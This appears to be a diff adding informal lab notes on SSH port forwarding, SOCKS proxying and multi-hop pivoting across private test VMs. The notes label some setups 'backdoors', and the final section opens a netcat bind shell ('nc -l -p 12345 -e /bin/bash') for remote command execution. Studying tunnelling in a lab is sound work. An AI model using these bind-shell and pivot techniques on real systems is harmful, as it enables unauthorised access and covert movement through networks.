@@ -1,0 +1,140 @@
+
+Test -3
+---------
+
+so we learned we can run a "backdoor" on the vps so lets do a tunnel into a VPS, install a backdoor 
+from VPS back to the final destination and back to us
+
+VM 1 = 
+    ssh -R 0.0.0.0:7777:0.0.0.0:5555 -p 1212 root@10.0.0.12
+    ncat -l -k -p 5555
+
+VM 2 = 10.0.0.12
+    ssh -NL 0.0.0.0:1212:10.0.0.10:2323 root@localhost
+
+VM 3 = 10.0.0.10
+    ssh -NL 0.0.0.0:2323:10.0.0.14:22 root@localhost
+
+VM 4    = 10.0.0.14
+    -> do nothing
+    
+Windows   = 10.0.0.11
+    ncat 10.0.0.14 7777
+    
+
+
+Test -2
+--------
+
+ssh -R basically opens a port on the target machine and gives me all data back to me
+
+VM VPS    = 10.0.0.14
+    ssh -R localhost:1234:localhost:5555 root@10.0.0.12 
+        
+        *** note usualy 0.0.0.0 != localhost but it will always change it to 0.0.0.0
+            
+        -> if we run netstat -antop | grep LISTEN on 10.0.0.12 we see sshd on 1234
+    nc -l -p 5555 (on listen we must put -p)
+
+VM 1      = 10.0.0.12
+    dont do nothing
+
+Windows   = 10.0.0.11
+    nc 10.0.0.12 1234
+        => bla bla => BOOM information drops on 10.0.0.14
+
+
+Test -1
+--------
+
+
+VM VPS    = 10.0.0.14
+    ssh -R localhost:1234:localhost:22 root@10.0.0.12
+
+VM 1      = 10.0.0.12
+    ssh -p 1234 root@localhost
+    
+
+    
+Test 0:
+--------
+
+Windows Source = 10.0.0.11
+    ssh -p 1212 root@10.0.0.12
+    curl --socks5 10.0.0.12:1213 http://10.0.0.14:801
+    
+    ncat -l -p 1234
+
+VM Tunnel 1 [Gateway] = 10.0.0.12
+    ssh -NL 0.0.0.0:1212:10.0.0.10:3434 root@localhost
+    ssh -NL 0.0.0.0:1213:10.0.0.10:3435 root@localhost
+
+VM Tunnel 2 = 10.0.0.10
+    ssh -NL 0.0.0.0:3434:10.0.0.14:22 root@localhost
+    ssh -ND 0.0.0.0:3435 root@localhost
+
+VM VPS    = 10.0.0.14
+    python -m http.server 801
+
+
+
+Test 1:
+---------
+
+Windows Source = 10.0.0.11
+curl --socks5 10.0.0.12:1212 http://10.0.0.14:801
+
+VM Tunnel 1 [Gateway] = 10.0.0.12
+ssh -NL 0.0.0.0:1212:10.0.0.10:3434 root@localhost
+
+VM Tunnel 2 = 10.0.0.10
+ssh -ND 0.0.0.0:3434 root@localhost
+
+VM VPS    = 10.0.0.14
+python3 http.server 801
+
+
+Test 2:
+-------
+
+Windows Source = 10.0.0.11
+
+ssh -p 1212 root@10.0.0.12
+    => hostname -I
+        -> 10.0.0.14
+
+
+VM Tunnel 1 [Gateway] = 10.0.0.12
+ssh -NL 0.0.0.0:1212:10.0.0.10:3434 root@localhost
+
+VM Tunnel 2 = 10.0.0.10
+ssh -NL 3434:10.0.0.14:22 root@localhost
+
+VM VPS    = 10.0.0.14
+
+
+Test 3:
+--------
+
+Windows Source = 10.0.0.11
+    ssh -J root@10.0.0.12,root@10.0.0.10 root@10.0.0.14
+        => cool works
+
+
+Test 3 (backdoor shell)
+------------------------
+
+Windows Source = 10.0.0.11
+ncat 10.0.0.14 12345 
+    => whoami
+
+
+VM Tunnel 1 [Gateway] = 10.0.0.12
+ssh -NL 0.0.0.0:1212:10.0.0.10:3434 root@localhost
+
+VM Tunnel 2 = 10.0.0.10
+ssh -NL 3434:10.0.0.14:22 root@localhost
+
+VM VPS    = 10.0.0.14
+nc -l -p 12345 -e /bin/bash
+
